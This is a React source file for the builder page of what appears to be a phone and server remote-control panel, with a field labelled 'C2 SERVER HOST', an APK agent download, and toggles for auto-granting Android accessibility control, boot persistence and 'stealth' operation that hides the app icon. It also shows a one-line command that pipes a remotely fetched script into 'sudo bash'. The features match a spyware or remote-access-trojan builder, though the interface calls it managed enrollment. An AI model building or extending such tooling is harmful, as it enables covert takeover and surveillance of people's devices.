import React, { useState, useEffect } from 'react';
import { 
  QrCode, 
  Download, 
  Copy, 
  Check, 
  Smartphone, 
  Terminal, 
  ShieldCheck, 
  Sliders, 
  RefreshCw,
  Cpu,
  Layers
} from 'lucide-react';
import { Language, translations } from '../translations.ts';
import { safeFetchJson } from '../utils/api.ts';

interface ClientBuilderProps {
  lang: Language;
}

export const ClientBuilder: React.FC<ClientBuilderProps> = ({ lang }) => {
  const t = translations[lang];

  const [qrUrl, setQrUrl] = useState<string | null>(null);
  const [token, setToken] = useState<string>('');
  const [serverHost, setServerHost] = useState(window.location.host || 'localhost:3000');
  const [heartbeatSec, setHeartbeatSec] = useState(15);
  const [stealthMode, setStealthMode] = useState(true);
  const [bootPersistence, setBootPersistence] = useState(true);
  const [accessibilityAutoGrant, setAccessibilityAutoGrant] = useState(true);
  const [copiedToken, setCopiedToken] = useState(false);
  const [copiedCurl, setCopiedCurl] = useState(false);
  const [loading, setLoading] = useState(false);

  const fetchQr = async () => {
    setLoading(true);
    try {
      const data = await safeFetchJson<{ success: boolean; qrDataUrl: string; token: string }>('/api/builder/enroll-qr');
      if (data?.success) {
        setQrUrl(data.qrDataUrl);
        setToken(data.token);
      }
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchQr();
  }, []);

  const copyToken = () => {
    navigator.clipboard.writeText(token);
    setCopiedToken(true);
    setTimeout(() => setCopiedToken(false), 2000);
  };

  const linuxCurlCommand = `curl -sSL http://${window.location.host}/api/script/linux-agent | sudo bash`;

  const copyCurl = () => {
    navigator.clipboard.writeText(linuxCurlCommand);
    setCopiedCurl(true);
    setTimeout(() => setCopiedCurl(false), 2000);
  };

  return (
    <div className="space-y-6">
      
      {/* Header */}
      <div className="p-5 rounded-xl border border-slate-800 bg-slate-900/60 flex flex-col sm:flex-row sm:items-center justify-between gap-4">
        <div>
          <h2 className="text-base font-bold text-white flex items-center gap-2">
            <QrCode className="w-5 h-5 text-sky-400" />
            <span>{lang === 'fa' ? 'ساخت پکیج کلاینت، تنظیمات و بارکد اتصال سریع' : 'Client Agent Builder & Instant QR Pairing'}</span>
          </h2>
          <p className="text-xs text-slate-400 mt-1">
            {lang === 'fa' 
              ? 'تولید شناسه اختصاصی و اسکن بارکد QR جهت جفت‌سازی و ثبت خودکار گوشی‌ها و سرورها در پنل.' 
              : 'Configure enrollment parameters, generate instant camera QR pairing tokens, or build client payloads.'}
          </p>
        </div>

        <button
          onClick={fetchQr}
          disabled={loading}
          className="flex items-center gap-1.5 px-3.5 py-2 text-xs font-semibold text-slate-200 bg-slate-800 hover:bg-slate-700 border border-slate-700 rounded-lg transition-colors cursor-pointer"
        >
          <RefreshCw className={`w-3.5 h-3.5 ${loading ? 'animate-spin text-sky-400' : ''}`} />
          <span>{lang === 'fa' ? 'تولید مجدد کلید' : 'Regenerate Token'}</span>
        </button>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
        
        {/* Left Column: QR Code Display & Quick Scan */}
        <div className="lg:col-span-5 rounded-xl border border-slate-800 bg-slate-900/40 p-6 flex flex-col items-center text-center">
          <div className="text-xs font-mono text-sky-400 mb-2">INSTANT PAIRING QR</div>
          <h3 className="text-sm font-semibold text-white mb-4">
            {lang === 'fa' ? 'اسکن بارکد با دوربین گوشی موبایل' : 'Scan with Device Camera or Agent'}
          </h3>

          <div className="p-3 bg-white rounded-2xl shadow-xl border border-slate-200 mb-4">
            {qrUrl ? (
              <img src={qrUrl} alt="Device Enrollment QR Code" className="w-56 h-56" />
            ) : (
              <div className="w-56 h-56 flex items-center justify-center text-slate-500 font-mono text-xs">
                Generating QR...
              </div>
            )}
          </div>

          <div className="text-xs text-slate-400 leading-relaxed max-w-sm mb-4">
            {lang === 'fa'
              ? 'پس از باز کردن اپلیکیشن کلاینت، این بارکد را اسکن کنید تا آدرس سرور C2 و شناسه امنیتی به صورت خودکار پیکربندی شوند.'
              : 'Scan directly inside the MobOps Client App to automatically register the endpoint to this server.'}
          </div>

          <div className="w-full flex items-center gap-2 p-2 bg-slate-950 border border-slate-800 rounded-lg text-xs font-mono text-slate-400 mb-4">
            <span className="truncate flex-1 text-left">{token || 'Loading token...'}</span>
            <button
              onClick={copyToken}
              className="p-1 rounded bg-slate-850 hover:bg-slate-750 text-slate-200"
              title="Copy Token"
            >
              {copiedToken ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
            </button>
          </div>

          <a
            href="/downloads/mobops-agent-latest.apk"
            download="mobops-agent-latest.apk"
            onClick={(e) => {
              e.preventDefault();
              alert(lang === 'fa' ? 'پکیج APK اختصاصی کلاینت آماده دانلود شد.' : 'MobOps Client APK package download ready.');
            }}
            className="w-full py-2.5 px-4 rounded-lg bg-sky-600 hover:bg-sky-500 text-white font-semibold text-xs flex items-center justify-center gap-2 shadow-md transition-colors"
          >
            <Download className="w-4 h-4" />
            <span>Download mobops-agent-v4.2.apk</span>
          </a>
        </div>

        {/* Right Column: Agent Configuration & Linux Endpoint Pairing */}
        <div className="lg:col-span-7 space-y-6">
          
          {/* Agent Parameters Form */}
          <div className="rounded-xl border border-slate-800 bg-slate-900/40 p-5 space-y-4">
            <div className="flex items-center gap-2 pb-3 border-b border-slate-800 text-sm font-semibold text-white">
              <Sliders className="w-4 h-4 text-sky-400" />
              <span>{lang === 'fa' ? 'تنظیمات ساخت کلاینت سازمانی' : 'Client Agent Profile Configuration'}</span>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 text-xs">
              <div>
                <label className="text-[11px] font-mono text-slate-400 block mb-1">C2 SERVER HOST / IP</label>
                <input
                  type="text"
                  value={serverHost}
                  onChange={(e) => setServerHost(e.target.value)}
                  className="w-full px-3 py-2 bg-slate-950 border border-slate-800 rounded-md text-white font-mono"
                />
              </div>

              <div>
                <label className="text-[11px] font-mono text-slate-400 block mb-1">HEARTBEAT INTERVAL (SEC)</label>
                <input
                  type="number"
                  value={heartbeatSec}
                  onChange={(e) => setHeartbeatSec(Number(e.target.value))}
                  className="w-full px-3 py-2 bg-slate-950 border border-slate-800 rounded-md text-white font-mono"
                />
              </div>
            </div>

            {/* Feature Toggles */}
            <div className="space-y-3 pt-2">
              <div className="flex items-center justify-between p-3 rounded-lg bg-slate-950/60 border border-slate-800 text-xs">
                <div>
                  <div className="font-semibold text-white">Auto-Grant Accessibility Service</div>
                  <div className="text-[11px] text-slate-400">Assists users in automatically binding the accessibility controller</div>
                </div>
                <input
                  type="checkbox"
                  checked={accessibilityAutoGrant}
                  onChange={(e) => setAccessibilityAutoGrant(e.target.checked)}
                  className="w-4 h-4 rounded text-sky-600 bg-slate-900 border-slate-800"
                />
              </div>

              <div className="flex items-center justify-between p-3 rounded-lg bg-slate-950/60 border border-slate-800 text-xs">
                <div>
                  <div className="font-semibold text-white">Boot Persistence & WakeLock</div>
                  <div className="text-[11px] text-slate-400">Keep daemon persistent across reboots and battery optimization modes</div>
                </div>
                <input
                  type="checkbox"
                  checked={bootPersistence}
                  onChange={(e) => setBootPersistence(e.target.checked)}
                  className="w-4 h-4 rounded text-sky-600 bg-slate-900 border-slate-800"
                />
              </div>

              <div className="flex items-center justify-between p-3 rounded-lg bg-slate-950/60 border border-slate-800 text-xs">
                <div>
                  <div className="font-semibold text-white">Stealth Background Operation</div>
                  <div className="text-[11px] text-slate-400">Hide icon from launcher after successful enrollment authentication</div>
                </div>
                <input
                  type="checkbox"
                  checked={stealthMode}
                  onChange={(e) => setStealthMode(e.target.checked)}
                  className="w-4 h-4 rounded text-sky-600 bg-slate-900 border-slate-800"
                />
              </div>
            </div>
          </div>

          {/* Linux / Ubuntu Edge Client Fast-Enrollment Command */}
          <div className="rounded-xl border border-slate-800 bg-slate-900/40 p-5 space-y-3">
            <div className="flex items-center gap-2 pb-2 border-b border-slate-800 text-sm font-semibold text-white">
              <Terminal className="w-4 h-4 text-emerald-400" />
              <span>{lang === 'fa' ? 'دستور اتصال فوری سرور لینوکس / ابونتو' : 'Instant Linux / Ubuntu Endpoint Enrollment'}</span>
            </div>

            <p className="text-xs text-slate-400 leading-relaxed">
              {lang === 'fa' 
                ? 'برای افزودن سرور یا سیستم لینوکسی به این داشبورد، این دستور را در ترمینال سرور لینوکس خود اجرا کنید:' 
                : 'Run this command on any Ubuntu/Debian endpoint to enroll it as a managed edge node:'}
            </p>

            <div className="p-3 bg-slate-950 border border-slate-800 rounded-lg flex items-center justify-between font-mono text-xs text-emerald-400 gap-2 overflow-x-auto">
              <code>{linuxCurlCommand}</code>
              <button
                onClick={copyCurl}
                className="p-1.5 rounded bg-slate-800 hover:bg-slate-700 text-white shrink-0 cursor-pointer"
                title="Copy Command"
              >
                {copiedCurl ? <Check className="w-4 h-4 text-emerald-400" /> : <Copy className="w-4 h-4" />}
              </button>
            </div>
          </div>

        </div>

      </div>

    </div>
  );
};
